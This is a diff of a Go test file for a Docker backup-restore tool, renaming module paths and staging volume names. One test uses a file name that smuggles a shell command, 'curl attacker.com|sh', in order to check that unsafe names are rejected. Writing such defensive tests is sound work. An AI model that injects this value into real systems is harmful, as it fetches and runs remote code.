@@ -3,12 +3,12 @@ package restore_test
 import (
 	"testing"
 
-	"github.com/offen/restore-manager/internal/docker"
-	"github.com/offen/restore-manager/internal/restore"
+	"github.com/bocklucas/dvb-made-easy/internal/docker"
+	"github.com/bocklucas/dvb-made-easy/internal/restore"
 )
 
 func TestBuildExtractionConfigUnencrypted(t *testing.T) {
-	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz", "offen-restore-staging", "restore123", "target-volume", "")
+	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz", "dvb-restore-staging", "restore123", "target-volume", "")
 	if err != nil {
 		t.Fatalf("unexpected error: %s", err)
 	}
@@ -33,11 +33,11 @@ func TestBuildExtractionConfigUnencrypted(t *testing.T) {
 		t.Fatalf("env: got %v, want [BACKUP_FILE=...]", cfg.Env)
 	}
 
-	assertMounts(t, cfg.Mounts, "offen-restore-staging", "target-volume")
+	assertMounts(t, cfg.Mounts, "dvb-restore-staging", "target-volume")
 }
 
 func TestBuildExtractionConfigEncrypted(t *testing.T) {
-	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz.gpg", "offen-restore-staging", "restore456", "target-volume", "my-secret-pass")
+	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz.gpg", "dvb-restore-staging", "restore456", "target-volume", "my-secret-pass")
 	if err != nil {
 		t.Fatalf("unexpected error: %s", err)
 	}
@@ -53,7 +53,7 @@ func TestBuildExtractionConfigEncrypted(t *testing.T) {
 }
 
 func TestBuildExtractionConfigUnsafeFilename(t *testing.T) {
-	_, err := restore.BuildExtractionConfig("x;curl attacker.com|sh;.tar.gz", "offen-restore-staging", "restore789", "target-volume", "")
+	_, err := restore.BuildExtractionConfig("x;curl attacker.com|sh;.tar.gz", "dvb-restore-staging", "restore789", "target-volume", "")
 	if err == nil {
 		t.Fatal("expected error for unsafe filename, got nil")
 	}
